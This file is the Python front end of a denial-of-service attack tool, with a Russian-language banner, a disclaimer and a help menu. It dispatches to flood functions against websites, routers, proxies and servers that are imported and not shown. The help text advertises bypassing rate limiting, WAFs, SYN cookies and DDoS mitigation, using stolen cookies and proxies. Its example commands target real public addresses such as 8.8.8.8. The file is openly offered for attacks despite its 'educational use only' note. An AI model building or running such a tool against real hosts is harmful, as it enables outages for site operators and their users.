import sys
import argparse
from function.local import test_local
from function.web import test_web
from function.server import test_server
from function.ip import test_ip
from function.proxy import test_proxy

def main():
    banner = """
▓█████▄ ▓█████▄  ▒█████    ██████    ▒██   ██▒
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒▒ █ █ ▒░
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ░░  █   ░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒    ░ █ █ ▒ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒██▒ ▒██▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░   ░░   ░▒ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░      ░    ░  
   ░       ░        ░ ░        ░      ░    ░  
 ░       ░                                    
"""
    
    warning = """
Данная утилита является мощной программой для DDoS - атак, но не смотря на это он используется только в учебных целях!
Не разрешается: атаковать чужие сервера, сайты, роутеры, порты, прокси сервера, соеденения любых типов!
Продолжая использование данной программы вы соглашаетесь с политикой конфиденциальности и берете всю ответственность на себя!

для получения списка команд введите команду -help.
"""
    
    print(banner)
    print(warning)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='DDoS Testing Tool')
        parser.add_argument('--target', type=str, required=True, help='Target URL or IP:port')
        parser.add_argument('--local-server', action='store_true', help='Test local server')
        parser.add_argument('--web', action='store_true', help='Test website')
        parser.add_argument('--ip-port', action='store_true', help='Test IP (router)')
        parser.add_argument('--server-ip-port', action='store_true', help='Test server')
        parser.add_argument('--proxy-ip-port', action='store_true', help='Test proxy server')
        parser.add_argument('--user-agent', action='store_true', help='Use parsed user agents')
        parser.add_argument('--cookie', action='store_true', help='Use cookie data')
        parser.add_argument('--bypassing-protection', action='store_true', help='Bypass protection methods')
        parser.add_argument('--proxy', action='store_true', help='Use proxies')
        
        args = parser.parse_args()
        
        if args.local_server:
            test_local(
                target=args.target,
                use_user_agent=args.user_agent,
                use_cookie=args.cookie,
                use_bypass=args.bypassing_protection,
                use_proxy=args.proxy
            )
        elif args.web:
            test_web(
                target=args.target,
                use_user_agent=args.user_agent,
                use_cookie=args.cookie,
                use_bypass=args.bypassing_protection,
                use_proxy=args.proxy
            )
        elif args.ip_port:
            test_ip(
                target=args.target,
                use_user_agent=args.user_agent,
                use_cookie=args.cookie,
                use_bypass=args.bypassing_protection,
                use_proxy=args.proxy
            )
        elif args.proxy_ip_port:
            test_proxy(
                target=args.target,
                use_user_agent=args.user_agent,
                use_cookie=args.cookie,
                use_bypass=args.bypassing_protection,
                use_proxy=args.proxy
            )
        elif args.server_ip_port:
            test_server(
                target=args.target,
                use_user_agent=args.user_agent,
                use_cookie=args.cookie,
                use_bypass=args.bypassing_protection,
                use_proxy=args.proxy
            )
        else:
            print("Укажите тип тестирования: --local-server, --web, --ip-port, --server-ip-port или --proxy-ip-port")
    else:
        while True:
            command = input("Введите команду: ").strip()
            
            if command == "-help":
                help_text = """
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ --local-server - для тестирования локальных хостингов.                                                                      ║
║ --web - для тестирования веб-сайтов.                                                                                        ║
║ --ip-port - для тестирования роутеров и сетевых устройств.                                                                  ║
║ --proxy-ip-port - для тестирования прокси серверов.                                                                         ║
║ --server-ip-port - для тестирования серверов.                                                                               ║
║ --user-agent - использование спаршенных юзер-агентов.                                                                       ║
║ --cookie - использование чужих куки данных.                                                                                 ║
║ --bypassing-protection                                                                                                      ║
║   ╠ Rate Limiting (ограничение скорости)                                                                                    ║
║   ╠ IP Blacklisting (черные списки)                                                                                         ║
║   ╠ Behavioral Analysis (анализ поведения)                                                                                  ║
║   ╠ Geo-blocking (геоблокировка)                                                                                            ║
║   ╠ Protocol Validation (проверка протокола)                                                                                ║
║   ╠ Traffic Shaping (формирование трафика)                                                                                  ║
║   ╠ IP Reputation (репутация IP)                                                                                            ║
║   ╠ SYN Cookies                                                                                                             ║
║   ╠ Web Application Firewall (WAF)                                                                                          ║
║   ╠ Anycast Network                                                                                                         ║
║   ╚ DDoS Mitigation Services                                                                                                ║
║                                                                                                                             ║
║ --proxy - использование прокси при тестировании.                                                                            ║
║ --target - указывать в самом начале до ссылки/ip/port/servers                                                               ║
║                                                                                                                             ║
║ пример команды для тестирования сайта:                                                                                      ║
║ ╠ python ddos.py --target "http://example.com" --web --user-agent --cookie --bypassing-protection --proxy                   ║
║ ╚ python ddos.py --target "https://example.com" --web --user-agent --cookie --bypassing-protection --proxy                  ║
║                                                                                                                             ║
║ пример команды для тестирования роутера:                                                                                    ║
║ ╠ python ddos.py --target "192.168.1.1:80" --ip-port --user-agent --cookie --bypassing-protection --proxy                  ║
║ ╚ python ddos.py --target "192.168.1.1:443" --ip-port --user-agent --cookie --bypassing-protection --proxy                 ║
║                                                                                                                             ║
║ пример команды для тестирования прокси:                                                                                     ║
║ ╠ python ddos.py --target "proxy.example.com:8080" --proxy-ip-port --user-agent --cookie --bypassing-protection --proxy     ║
║ ╚ python ddos.py --target "1.2.3.4:3128" --proxy-ip-port --user-agent --cookie --bypassing-protection --proxy               ║
║                                                                                                                             ║
║ пример команды для тестирования сервера:                                                                                    ║
║ ╠ python ddos.py --target "8.8.8.8:80" --server-ip-port --user-agent --cookie --bypassing-protection --proxy                ║
║ ╚ python ddos.py --target "8.8.8.8:443" --server-ip-port --user-agent --cookie --bypassing-protection --proxy               ║
║                                                                                                                             ║
║ пример команды для тестирования локальных хостеров:                                                                         ║
║ ╠ python ddos.py --target "http://10.192.87.231:5000" --local-server --user-agent --cookie --bypassing-protection --proxy   ║
║ ╚ python ddos.py --target "10.192.87.231:5000" --local-server --user-agent --cookie --bypassing-protection --proxy          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""
                print(help_text)
            elif command == "-exit":
                print("Выход...")
                sys.exit()
            else:
                print("Неизвестная команда. Введите -help для списка команд или -exit для выхода.")

if __name__ == "__main__":
    main()